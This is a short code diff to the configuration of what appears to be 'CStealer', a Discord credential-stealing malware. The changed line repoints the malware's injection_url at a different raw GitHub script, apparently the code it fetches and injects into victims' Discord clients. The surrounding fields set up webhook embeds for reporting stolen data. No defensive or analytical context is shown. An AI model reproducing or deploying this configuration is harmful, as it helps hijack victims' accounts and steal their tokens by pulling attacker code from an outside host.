@@ -17,7 +17,7 @@ const config = {
   embed_name: 'CStealer Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/index.js', 
   /**
    
    **/
